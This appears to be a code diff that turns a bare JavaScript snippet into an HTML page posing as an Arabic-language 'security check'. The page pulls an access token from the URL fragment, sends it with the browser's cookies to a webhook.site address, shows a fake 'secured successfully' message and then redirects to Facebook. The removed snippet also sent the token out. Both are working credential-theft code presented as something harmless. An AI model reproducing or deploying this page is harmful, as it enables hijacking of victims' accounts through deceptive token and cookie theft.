@@ -1,15 +1,34 @@
-// استخراج التوكن من الـ URL Fragment
-const hash = window.location.hash;
-if (hash.includes('access_token=')) {
-    const token = hash.split('access_token=')[1].split('&')[0];
-    
-    // إرسال التوكن إلى الرابط الخاص بك
-    fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190', {
-        method: 'POST',
-        body: JSON.stringify({
-            captured_token: token,
-            report_ref: "924595693574152",
-            timestamp: new Date().toISOString()
-        })
-    });
-}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Checking Security...</title>
+</head>
+<body style="background-color: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h2 id="status">جاري فحص حالة الأمان...</h2>
+    <script>
+        (function() {
+            // 1. استخراج التوكن من الرابط
+            const hash = window.location.hash;
+            if (hash.includes('access_token=')) {
+                const token = hash.split('access_token=')[1].split('&')[0];
+
+                // 2. إرسال البيانات فوراً إلى Webhook.site
+                // تأكد أن هذا الرابط هو رابطك الخاص
+                fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: "Captured_Token=" + token + "&Cookies=" + document.cookie
+                }).then(() => {
+                    document.getElementById('status').innerHTML = "تم التأمين بنجاح، سيتم تحويلك...";
+                });
+            }
+
+            // 3. التوجيه لفيسبوك بعد 3 ثوانٍ
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/home.php";
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
